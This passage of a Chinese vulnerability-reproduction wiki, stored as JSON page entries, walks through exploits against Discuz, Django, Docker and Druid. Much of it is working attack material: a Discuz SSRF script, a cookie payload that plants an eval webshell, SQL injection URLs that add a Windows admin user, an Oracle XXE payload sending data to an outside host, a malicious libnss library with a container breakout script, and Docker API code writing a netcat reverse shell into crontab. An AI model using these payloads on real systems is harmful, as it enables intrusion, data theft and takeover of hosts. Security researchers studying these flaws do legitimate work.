可以发现无指定协议的默认就是http协议，://是代表访问本地dz/forum.php表示路径和path，因此能够访问首页，到这里就有了一个可以对通网站下进行ssrf的漏洞点。 Curl的配置当中开启了跳转 再找到一个站内的url跳转，就能绕过站内curl的限制，实现真正的ssrf。 前台任意url跳转 /source/class/class_member.php 310行 调用了dreferer()结果作为跳转地址，继续跟进该函数。 source/function/function_core.php 1498行 $_G['referer']这个参数我们可控，同样使用了parse_url进行了解析，首先对协议进行了判断，需要属于http/https。 然后又对host字段和$_SERVER['HTTP_HOST']进行了对比，判断是否在同一个域名下，因为攻击中是通过curl发起的请求，$_SERVER['HTTP_HOST']此时为空，但是和www.进行了，因此这里域名为www.即可绕过判断成功注入location字段 此时处理跳转的是php的curl，curl这里会因为#@出现解析问题，会跳转到192.168.2.63:6666，也就是形成ssrf。 站内ssrf->前台get型的任意url跳转->ssrf漏洞 总结： 因为应用程序的远程下载功能过滤不严，利用php中的parse_url还有curl解析特性，配合前台任意URL跳转漏洞，可以造成SSRF漏洞。 poc htp://www.0-sec.org/code-src/dz/Discuz_TC_BIG5/upload/member.php?mod=logging&action=logout&XDEBUG_SESSION_START=13904&referer=http://localhost%23%40www.baidu.com&quickforward=1 python 脚本 # coding=utf-8 import requests import re from urllib.parse import urlparse, quote from urllib import parse if __name__ == \"__main__\": url = \"http://192.168.66.129/dz/\" ssrf_target = \"192.168.0.36:6666\" path = urlparse(url).path payload = quote( \"/member.php?mod=logging&action=logout&quickforward=1&referer=http://www.%23%40{ssrf_target}\".format( ssrf_target=ssrf_target)) s = requests.Session() html = s.get(url).text searchObj = re.search(r'name=\"formhash\" value=\"(.*?)\"', html, re.M | re.I) formhash = searchObj.group(1) rs = s.post( url + \"misc.php?mod=imgcropper&imgcroppersubmit=1&formhash={formhash}&picflag=2&cutimg={path}{payload}\".format( formhash=formhash, path=path, payload=payload)) exit() 参考链接 http://www.rai4over.cn/2018/12/07/Discuz-3-4%E5%89%8D%E5%8F%B0%E6%9C%89%E9%99%90%E5%88%B6SSRF%E6%BC%8F%E6%B4%9E/index.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:25 "},"Web安全/Discuz/Discuz! X3.4 后台任意文件删除/Discuz! X3.4 后台任意文件删除.html":{"url":"Web安全/Discuz/Discuz! X3.4 后台任意文件删除/Discuz! X3.4 后台任意文件删除.html","title":"Discuz! X3.4 后台任意文件删除","keywords":"","body":"Discuz! X3.4 后台任意文件删除 一、漏洞简介 后台任意文件删除，需要有管理员的权限。 二、漏洞影响 Discuz!X V3.4 三、复现过程 漏洞分析 分析一下该请求的流程。 请求URL：/dz/upload/admin.php?action=forums&operation=edit&fid=2&replybgnew=../../../testfile.txt&delreplybg=1 在admin.php中接收了action参数，在第58行经过admincpfile函数处理后返回文件路径，并包含该文件。 if($admincp->allow($action, $operation, $do) || $action == 'index') { require $admincp->admincpfile($action); 看一下该函数的处理过程： function admincpfile($action) { return './source/admincp/admincp_'.$action.'.php'; } 经过处理返回的内容是：./source/admincp/admincp_forums.php，也就来到了漏洞存在的地方。 根据if/else的判断条件，进入else中的代码： if(!submitcheck('detailsubmit')) { ...... } else{ } 造成漏洞的代码： if(!$multiset) { if($_GET['delreplybg']) { $valueparse = parse_url($_GET['replybgnew']); if(!isset($valueparse['host']) && file_exists($_G['setting']['attachurl'].'common/'.$_GET['replybgnew'])) { @unlink($_G['setting']['attachurl'].'common/'.$_GET['replybgnew']); } $_GET['replybgnew'] = ''; } $multiset默认为0，只要不给该参数赋值就满足条件进入if语句。 第二个if语句，检查GET参数delreplybg有没有内容，然后做了下检测，检测parse_url函数返回的结果中有没有host这个变量，来确保GET参数replybgnew不是url，但是并不影响传入文件路径。 这里$_G['setting']['attachurl'的值为data/attachment/，再拼接上common/和$_GET['replybgnew']，这样路径就可控了。通过unlink达到文件删除的目的。 漏洞复现 登陆后台，进入论坛->模块管理->编辑板块，使用burp拦截提交的数据。 发送，查看文件发现被删除。 参考链接 https://xz.aliyun.com/t/7492\\#toc-7 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:28 "},"Web安全/Discuz/Discuz!ML 3.x 代码执行漏洞/Discuz!ML 3.x 代码执行漏洞.html":{"url":"Web安全/Discuz/Discuz!ML 3.x 代码执行漏洞/Discuz!ML 3.x 代码执行漏洞.html","title":"Discuz!ML 3.x 代码执行漏洞","keywords":"","body":"Discuz!ML 3.x 代码执行漏洞 一、漏洞简介 漏洞类型：代码执行漏洞漏洞原因：Discuz!ML 系统对cookie中的l接收的language参数内容未过滤，导致字符串拼接，从而执行php代码。 二、影响范围 Discuz!ML V3.2-3.4 三、复现过程 cookie字段中会出现xxxx_xxxx_language字段，根本原因就是这个字段存在注入，导致的RCE抓包找到cookie的language的值修改为 xxxx_xxxx_language=sc'.phpinfo().' getshell %27.%2Bfile_put_contents%28%27shell.php%27%2Curldecode%28%27%253C%253Fphp%2520eval%2528%2524_POST%255B%25221%2522%255D%2529%253B%253F%253E%27%29%29.%27 实际为： '.+file_put_contents('shell.php',urldecode('')).' 即可在路径下生成shell.php，连接密码为1 https://github.com/ianxtianxt/discuz-ml-rce Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:13 "},"Web安全/Django/（CVE-2017-12794）Django debug page XSS漏洞/（CVE-2017-12794）Django debug page XSS漏洞.html":{"url":"Web安全/Django/（CVE-2017-12794）Django debug page XSS漏洞/（CVE-2017-12794）Django debug page XSS漏洞.html","title":"（CVE-2017-12794）Django debug page XSS漏洞","keywords":"","body":"（CVE-2017-12794）Django debug page XSS漏洞 一、漏洞简介 Django 发布了新版本1.11.5，修复了500页面中可能存在的一个 XSS 漏洞 二、漏洞影响 Django \\ 三、复现过程 经过我的测试，我发现在使用Postgres数据库并触发异常的时候，psycopg2会将字段名和字段值全部抛出。那么，如果字段值中包含我们可控的字符串，又由于0x02中说到的，这个字符串其实就会被设置成__cause__，最后被显示在页面中。 所以我们假设有如下场景： 用户注册页面，未检查用户名 注册一个用户名为alert(1)的用户 再次注册一个用户名为alert(1)的用户 触发duplicate key异常，导致XSS漏洞 访问http://www.0-sec.org:8000/create_user/?username=alert(1)创建一个用户，成功；再次访问http://www.0-sec.org:8000/create_user/?username=alert(1)，触发异常： DjangodebugpageXSS漏洞/media/rId24.png) 可见，Postgres抛出的异常为 duplicate key value violates unique constraint \"xss_user_username_key\" DETAIL: Key (username)=(alert(1)) already exists. 这个异常被拼接进The above exception ({{ frame.exc_cause }}) was the direct cause of the following exception，最后触发XSS。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:42 "},"Web安全/Django/（CVE-2018-14574）Django  2.0.8 任意URL跳转漏洞/（CVE-2018-14574）Django  2.0.8 任意URL跳转漏洞.html":{"url":"Web安全/Django/（CVE-2018-14574）Django  2.0.8 任意URL跳转漏洞/（CVE-2018-14574）Django  2.0.8 任意URL跳转漏洞.html","title":"（CVE-2018-14574）Django  2.0.8 任意URL跳转漏洞","keywords":"","body":"（CVE-2018-14574）Django \\ 一、漏洞简介 Django默认配置下，如果匹配上的URL路由中最后一位是/，而用户访问的时候没加/，Django默认会跳转到带/的请求中。（由配置项中的django.middleware.common.CommonMiddleware、APPEND_SLASH来决定）。 在path开头为//example.com的情况下，Django没做处理，导致浏览器认为目的地址是绝对路径，最终造成任意URL跳转漏洞。 该漏洞利用条件是目标URLCONF中存在能匹配上//example.com的规则。 二、漏洞影响 Django \\ 三、复现过程 访问http://your-ip:8000//www.example.com，即可返回是301跳转到//www.example.com/： Django Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:43 "},"Web安全/Django/（CVE-2019-14234）Django JSONField sql注入漏洞/（CVE-2019-14234）Django JSONField sql注入漏洞.html":{"url":"Web安全/Django/（CVE-2019-14234）Django JSONField sql注入漏洞/（CVE-2019-14234）Django JSONField sql注入漏洞.html","title":"（CVE-2019-14234）Django JSONField sql注入漏洞","keywords":"","body":"（CVE-2019-14234）Django JSONField sql注入漏洞 一、漏洞简介 该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。 Django通常搭配postgresql数据库，而JSONField是该数据库的一种数据类型。该漏洞的出现的原因在于Django中JSONField类的实现，Django的model最本质的作用是生成SQL语句，而在Django通过JSONField生成sql语句时，是通过简单的字符串拼接。 通过JSONField类获得KeyTransform类并生成sql语句的位置。 其中key_name是可控的字符串，最终生成的语句是WHERE (field->\\'[key_name]\\') = \\'value\\'，因此可以进行SQL注入。 二、漏洞影响 1.11.x before 1.11.23 2.1.x before 2.1.11 2.2.x before 2.2.4 三、复现过程 环境搭建 git clone https://github.com/vulhub/vulhub.git cd vulhub/django/CVE-2019-14234/ docker-compose up -d 漏洞利用 1、登录后台 http://ip:8000/admin/vuln/collection/ 2、构造URL进行查询 http://ip:8000/admin/vuln/collection/?detail\\_\\_a%27b=123 DjangoJSONFieldsql注入漏洞/media/rId28.png) 可以看到已经注入成功，并且可以看到构造的SQL语句 为进一步验证注入语句，我们继续构造 http://ip:8000/admin/vuln/collection/?detail__title')='1' or 1=1-- 后台生成的sql语句的关键部分是 WHERE (\"vuln_collection\".\"detail\" -> 'title')='1' or 1=1-- ') = %s 由于or 1=1永为真，因此应该返回所有结果，页面返回结果符合预期，如下图 image 下一步结合CVE-2019-9193我们尝试进行命令注入，构造url如下 http://ip:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcreate table cmd_exec(cmd_output text)--%20 页面结果虽然报错，但是报错原因是no results to fetch，说明我们的语句已经执行 DjangoJSONFieldsql注入漏洞/media/rId29.png) 最终payload http://ip:8000/admin/vuln/collection/?detail__title')%3d'1' or 1%3d1 %3bcopy cmd_exec FROM PROGRAM 'net user admin admin /add'--%20 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:44 "},"Web安全/Django/（CVE-2020-7471）Django sql注入漏洞/（CVE-2020-7471）Django sql注入漏洞.html":{"url":"Web安全/Django/（CVE-2020-7471）Django sql注入漏洞/（CVE-2020-7471）Django sql注入漏洞.html","title":"（CVE-2020-7471）Django sql注入漏洞","keywords":"","body":"（CVE-2020-7471）Django sql注入漏洞 一、漏洞简介 Django是高水准的由Python编程语言驱动的一个开源Web应用程序框架，起源于开源社区。使用Django，程序员可以方便、快捷地创建高品质、易维护、数据库驱动的应用程序，应用广泛。2020年2月初，Django 官方发布安全通告公布了一个通过StringAgg（分隔符）实现利用的潜在SQL注入漏洞（CVE-2020-7471）。攻击者可通过构造分隔符传递给聚合函数contrib.postgres.aggregates.StringAgg，从而绕过转义并注入恶意SQL语句 二、漏洞影响 Django 1.11.x \\ 三、复现过程 环境安装 安装 django 漏洞版本，我测试用的是 pip install django==3.0.2 -i https://pypi.tuna.tsinghua.edu.cn/simple 参考 https://www.runoob.com/postgresql/windows-install-postgresql.html 完成 postgres 数据库的安装 新建数据库 CREATE DATABASE test; 修改 sqlvul_projects/settings.py 里面的数据库配置，如果上一步你安装用的默认配置（包括设置密码为postgres），就无需修改任何配置，可以跳过这一步 DATABASES = { 'default': { 'ENGINE': 'django.db.backends.postgresql', 'NAME': 'test', # 数据库名称 'USER': 'postgres', 'PASSWORD': 'postgres', # 数据库用户密码 'HOST': '127.0.0.1', # 数据库地址 'PORT': '5432', } } 通过 django 初始化数据表 python3 manage.py migrate python3 manage.py makemigrations vul_app python3 manage.py migrate vul_app poc # encoding:utf-8 import os import django os.environ.setdefault(\"DJANGO_SETTINGS_MODULE\", \"sqlvul_project.settings\") # Django 版本大于等于1.7的时候，需要加上下面两句 if django.VERSION >= (1, 7):#自动判断版本 django.setup() from vul_app.models import Info from django.contrib.postgres.aggregates import StringAgg from django.db.models import Count \"\"\" postgres 预先执行的SQL CREATE DATABASE test; \\c test; \\d 列出当前数据库的所有表格 \"\"\" def initdb(): data = [('li','male'),('zhao','male'),('zhang','female')] for name,gender in data: Info.objects.get_or_create(name=name,gender=gender) def query(): # FUZZ delimiter error_c = [] other_error_c = [] for c in \"!@#$%^&*()_+=-|\\\\\\\"':;?/>.然后运行 POC 脚本CVE-2020-7471.py就可以了 漏洞环境及其poc下载地址：https://github.com/ianxtianxt/CVE-2020-7471 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:45 "},"Web安全/Django/（CVE-2020-9402）Django Geo sql注入/（CVE-2020-9402）Django Geo sql注入.html":{"url":"Web安全/Django/（CVE-2020-9402）Django Geo sql注入/（CVE-2020-9402）Django Geo sql注入.html","title":"（CVE-2020-9402）Django Geo sql注入","keywords":"","body":"（CVE-2020-9402）Django Geo sql注入 一、漏洞简介 Django 1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞。攻击者可借助特制的SQL语句利用该漏洞查看、添加、修改或删除数据库中的信息。 二、漏洞影响 Django 1.11.29之前的1.11.x版本、2.2.11之前的2.2.x版本和3.0.4之前的3.0.x版本中存在SQL注入漏洞 三、复现过程 根据官网的修复https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927\\#diff-229e38ececbfc591f7a5e595bf5707c4，可以看到问题出在GIS的查询上面 DjangoGeosql注入/media/rId24.png) DjangoGeosql注入/media/rId25.png) 官方只修复了这两个位置，可以发现基本上是对于tolerance参数进行判断是否为数字。那首先来了解一下GIS查询。 GIS查询API是一个地理位置的查询API，提供用户存储精确GPS的位置的数据模块，属于一个空间数据库，我们可以通过如下的经纬度信息 pnt = GEOSGeometry('POINT(-96.876369 29.905320)', srid=4326) >>>SRID=4326;POINT (-96.876369 29.90532) 来获得一个具体的定位信息,通过如下的模块来构建一个基本的地理信息存储 from django.contrib.gis.db import models class Names(models.Model): name = models.CharField(max_length=128) def __str__(self): return self.name class Interstate(Names): path = models.LineStringField() 后台存储的时候发出path的信息为json数据，例如 {\"type\":\"LineString\",\"coordinates\":[[-8167.236601807093,-3286.248045708844],[-7896.285624495958,-3324.9553281818644],[1083.8039092445451,-654.1528375435246]]} DjangoGeosql注入/media/rId26.png) 我们就获得了一个基本的地理位置数据,同理，通过构造一个聚合的查询方法 def vuln(request): q = request.GET.get('q') qs=Interstate.objects.annotate( d=Distance( Point(-0.0733675346842369, -0.0295208671625432, srid=4326), Point(0.009735976166628611, -0.00587635491086091, srid=4326), tolerance = q, # default 0.05 ), ).filter(d=D(m=1)).values('name') 因为官网文档找不到如何构造Point查询，因此为了省事，直接写死了Point数值。。srid为空间参考的投影设置，默认值为4326。其中tolerance是对于oracle特殊存在的一个键值，其作用是基本你的容错率，详细的信息可以参考oracle官方文档。对应的查询语句为 SELECT \"APP_NAMEDMODEL\".\"NAME\" FROM \"APP_INTERSTATE\" INNER JOIN \"APP_NAMEDMODEL\" ON (\"APP_INTERSTATE\".\"NAMEDMODEL_PTR_ID\" = \"APP_NAMEDMODEL\".\"ID\") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) = 1.0 FETCH FIRST 21 ROWS ONLY; 0x02代码分析首先从传入一个url http://127.0.0.1:8000/vuln/?q=20) = 1 OR 1=1 OR (1%2B1 从annotate聚合函数开始跟进，同普通的model函数查询一样，gis查询虽然拥有着单独的model模块，但依旧还是依靠着普通model中进行过滤和查询。从gis的model文件夹中的__init__.py文件中看 DjangoGeosql注入/media/rId28.png) 主要的查询依然调用的是django最基本的db方法，而其中单独定义了function方法等一些对地理位置插叙独特的方法。程序运行到/django/db/models/manager.py文件中的_get_queryset_methods后，获取到tolerant参数之后便直接进入到gis模块中进行查询 DjangoGeosql注入/media/rId29.png) 继而进入到django/contrib/gis/measure.py文件中的MeasureBase类中进行方法调用，那么后面的方法分析可以跳过，因此直接来到漏洞代码段。先来看gis API中的functions函数，在as_oracle方法这一段 def as_oracle(self, compiler, connection, **extra_context): tol = self.extra.get('tolerance', self.tolerance) return self.as_sql( compiler, connection, template=\"%%(function)s(%%(expressions)s, %s)\" % tol, **extra_context ) tolerance 从self.extra.get导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为0.05，并且将其直接传入到新的变量中。之后则不对tol进行任何处理直接拼接到template字符串中并且传入as_sql方法。那么官方对于as_sql的文档是，此方法需要一个SQLCompiler对象，位于django/db/models/sql/compiler.py文件中。而我们只需要知道在该对象中有一个compile()方法，该方法可以返回一个包含SQL字符串的元祖，而SQLComiler对象中的query变量则是存储直接进行SQL查询语句的SQL命令。从而两个Point分别进入compile方法中进行拼接 DjangoGeosql注入/media/rId30.png) 不知道为什么，用pycharm在as_oracle下断点的时候，第一次到达SQLCompiler的时候，pycharm不会在as_oracle函数中停下来，而是在第二次查询的时候才会停，但是经过测试确实是在进入SQLCompiler之前调用过as_orcle函数，可能是pycharm没有正确识别重载函数吧。之后template构造模版也因此进入到expression.py中的as_sql函数中进行字符串构造 DjangoGeosql注入/media/rId31.png) 因此最后进入oracle的命令语句是 SELECT \"APP_NAMEDMODEL\".\"NAME\" FROM \"APP_INTERSTATE\" INNER JOIN \"APP_NAMEDMODEL\" ON (\"APP_INTERSTATE\".\"NAMEDMODEL_PTR_ID\" = \"APP_NAMEDMODEL\".\"ID\") WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) = 1 OR 1=1 OR (1+1) = 1.0 FETCH FIRST 21 ROWS ONLY; DjangoGeosql注入/media/rId32.png) 带入数据库中查询 DjangoGeosql注入/media/rId33.png) DjangoGeosql注入/media/rId34.png) 官方修复的方法就是加入Value函数，判断传入的值是否为数字，否的话直接报错推出。那么第二个注入点就是Union了，建立Model class City(Names): point = models.PointField() # 点模块 编辑传入的参数为 {\"type\":\"Point\",\"coordinates\":[13250.226757682816,68815.69380603009]} view中设置查询 from django.contrib.gis.db.models import Union def vuln2(request): q = request.GET.get('q') res = City.objects.aggregate( Union('point', tolerance=q), ) return HttpResponse(res) 输入url http://127.0.0.1:8000/vuln2?q=0.05)))%2C%20(((1 首先看结果，得到的SQL查询语句为 SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE(\"APP_CITY\".\"POINT\",0.05))), (((1))) AS \"POINT__UNION\" FROM \"APP_CITY\"; DjangoGeosql注入/media/rId35.png) 该aggregate查询方法是GIS查询特定的一种查询方法，为的是与地理查询的语句做适配,用法跟原模块的方法类似。因此跟进GIS模块中的聚合查询方法，位于django/contrib/gis/db/models/aggregates.py文件内的as_oracle方法。 DjangoGeosql注入/media/rId36.png) 同样tolerance没有做任何检查直接传入了template模版语句中，原理与上面annotate查询过程一致。利用有大致两个方法报错注入 http://localhost:8000/test/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null%20 OR (1%2B1 DjangoGeosql注入/media/rId37.png) CVE-2014-6577因为Django自2.0以后支持的oracle版本为12以上，因此可以尝试oracle XXE来进行SQL的注入。同时因为在SQL处理的过程中有三次利用%的模版跳转，因此需要在XMLpayload中的%替换为%%%%，payload为 http://localhost:8000/test/?q=20) = 1 OR (select%20extractvalue(xmltype('%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%25%25%25%20remote%20SYSTEM%20%22http%3A%2F%2Fdocker.for.mac.host.internal%3A9000%2F'%7C%7C(SELECT%20user%20from%20dual)%7C%7C'%22%3E%20%25%25%25%25remote%3B%5D%3E')%2C'%2Fl')%20from%20dual)%20is%20not%20null OR (1%2B1 DjangoGeosql注入/media/rId38.png) 命令执的话因为是docker起的oracle所以没有设置JAVA的环境，暂时也不能判定有没有，以后再研究看看。 参考链接 https://xz.aliyun.com/t/7403 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:50 "},"Web安全/Docker/（CVE-2019-14271）Docker copy漏洞/（CVE-2019-14271）Docker copy漏洞.html":{"url":"Web安全/Docker/（CVE-2019-14271）Docker copy漏洞/（CVE-2019-14271）Docker copy漏洞.html","title":"（CVE-2019-14271）Docker copy漏洞","keywords":"","body":"（CVE-2019-14271）Docker copy漏洞 一、漏洞简介 二、漏洞影响 Docker 19.03.1 三、复现过程 Docker cp Copy命令允许从容器、向容器中、或容器之间复制文件。语法与标准的unix cp命令非常相似。要从容器中复制/var/logs，语法是docker cp container_name:/var/logs /some/host/path。 从下图所示，要从容器中将文件复制出去，Docker使用了一个名为docker-tar的帮助进程。 Dockercopy漏洞/media/rId25.png) 图 1. 从容器中复制文件 docker-tar是通过chroot到容器，将请求的文件或目录存档，然后将生成的tar文件传递给Docker daemon，然后由daemon提取到主机的目标目录中。 注释：CHROOT就是Change Root，也就是改变程序执行时所参考的根目录位置。CHROOT可以增进系统的安全性，限制使用者能做的事。 Dockercopy漏洞/media/rId26.png) 图 2. docker-tar chroot到容器中 Chroot主要是为了避免系统链接的问题，当主机进程尝试访问容器中的文件时就可能会引发系统链接问题。如果访问的文件中有系统链接，就会解析到host root。因此，攻击者控制的容器就可以尝试和诱使docker cp在主机而非容器上读写文件。去年有许多Docker和Podman相关的系统链接CVE漏洞。通过chroot到容器的root，docker-tar可以确保所有系统链接都可以高效地解析。 但，chroot到容器然后从容器中复制文件可能会引发很严重的安全问题。 CVE-2019-14271 Docker是用Golang语言编写。有漏洞的Docker版本是用Go v1.11编译的。在该版本中，一些含有嵌入C代码（cgo）的包会在运行时动态加载共享的库。这些包包括net和os/user，都是docker-tar使用的，而且在运行时会加载多个libnss_*.so库。一般来说，库是从host文件系统加载的，但因为docker-tarchroot到了容器，因此会从容器文件系统中加载库。也就是说docker-tat会加载和执行来源于容器或由容器控制的代码。 需要说明的是，除了chroot到容器文件系统外，docker-tar并没有被容器化。它是在host命名空间运行的，权限为root全新且不受限于cgroups或seccomp。因此，通过注入代码到docker-tar，恶意容器就可以获取host主机的完全root访问权限。 可能的攻击场景有Docker用户从另一个Docker处复制文件： 容器运行含有恶意libnss_*.so库的镜像 容器中含有被攻击者替换的libnss_*.so库 在这两种情况下，攻击者都可以获取主机上的root代码执行权限。 漏洞利用 为利用该漏洞，研究人员需要先创建一个恶意libnss库。研究人员随意选择了libnss_files.so文件，下载了库函数的源码，并在代码中加入了一个函数------run_at_link()。研究人员还为该函数定义了constructor属性。constructor属性表明run_at_link函数在进程加载时会作为库的初始化函数执行。也就是说，当Docker-tar进程动态加载恶意库时，run_at_link函数就会执行。下面是run_at_link的代码： #include ... #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; if (!is_priviliged()) return; rename(ORIGINAL_LIBNSS, LIBNSS_PATH); fprintf(log_fp, \"switched back to the original libnss_file.so\"); if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } return true; // we're running in the context of docker-tar } 查/proc目录完成的。如果run_at_link运行在docker-tar环境下，那么目录就是空的，因为procfs挂载在/proc上只存在于容器的mount命名空间。 然后，run_at_link会用恶意libnss库替换原始库。这保证了漏洞利用运行的随后进程不会意外加载恶意版本，并触发run_at_link执行。 为简化该漏洞利用，run_at_link会尝试在容器的/breakout路径下运行可执行文件。这样漏洞利用的其他部分就可以用bash写入，而非C语言。让逻辑的其他部分在run_at_link外，意味着在漏洞利用每次变化后无需重新编译恶意库，只需改变breakout二进制文件就可以了。 Dockercopy漏洞/media/rId29.png) 利用CVE-2019-14271打破Docker 在该漏洞视频中，Docker用户会运行含有恶意libnss_files.so的恶意镜像，然后尝试从容器中复制一些日志。镜像中的/breakout二进制文件是一个简单的bash脚步，会挂载host文件系统到/host_fs的容器中，并将消息写入host的/evil目录。/breakout脚本代码如下： umount /host_fs && rm -rf /host_fs mkdir /host_fs mount -t proc none /proc # mount the host's procfs over /proc cd /proc/1/root # chdir to host's root mount --bind . /host_fs # mount host root at /host_fs echo \"Hello from within the container!\" > /host_fs/evil 四、参考链接 https://xz.aliyun.com/t/6806 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:51:01 "},"Web安全/Docker/Docker 未授权访问/Docker 未授权访问.html":{"url":"Web安全/Docker/Docker 未授权访问/Docker 未授权访问.html","title":"Docker 未授权访问","keywords":"","body":"Docker 未授权访问 一、漏洞简介 1. 基础介绍 http://www.loner.fm/drops/\\#\\#!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8 docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。 漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。 然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。 2. 测试环境配置 先关闭docker，然后开启： sudo service docker stop # 绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。 sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock 参考API规范进行渗透：https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/ 操作Docker API可以使用python dockert api 完成。 pip install docker-py API使用参考：https://docker-py.readthedocs.io/en/stable/api/\\#\\#client-api 二、影响范围 三、复现过程 利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。 import docker client = docker.DockerClient(base_url='http://your-ip:2375/') data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) 写入crontab文件，成功反弹shell： python脚本 https://github.com/ianxtianxt/docker\\_api\\_vul 安装类库 pip install -r requirements.txt 查看运行的容器 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 查看所有的容器 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a 查看所有镜像 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l 查看端口映射 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L 写计划任务（centos,redhat等,加-u参数用于ubuntu等） python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口 写sshkey(自行修改脚本的中公钥) python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k 在容器中执行命令 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e \"id\" -I 容器id 删除容器 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id 修改client api版本 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22 查看服务端api版本 python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V 3.3 其他的一些exp https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker\\_Remote\\_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.pyhttps://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8 4. 防护策略 1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker 服务才能生效。 2.修改 Docker 的启动参数： 定位到 DOCKER_OPTS 中的 tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1 或将默认端口 2375 改为自定义端口 为 Remote API 设置认证措施。参照 官方文档 配置 Rem 3.注意：该操作需要重启 Docker 服务才能生效。 修改 Docker 服务运行账号。请以较低权限账号运行 Docker 服务；另外，可以限制攻击者执行高危命令。 4.注意：该操作需要重启 Docker 服务才能生效。 设置防火墙策略。如果正常业务中 API 服务需要被其他服务器来访问，可以配置安全组策略或 iptables 策略，仅允许指定的 IP 来访问 Docker 接口。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:50:57 "},"Web安全/Druid/Druid 未授权访问漏洞/Druid 未授权访问漏洞.html":{"url":"Web安全/Druid/Druid 未授权访问漏洞/Druid 未授权访问漏洞.html","title":"Druid 未授权访问漏洞","keywords":"","body":"Druid 未授权访问漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 当开发者配置不当时就可能造成未授权访问下面给出常见Druid未授权访问路径 /druid/websession.html /system/druid/websession.html /webpage/system/druid/websession.html(jeecg) 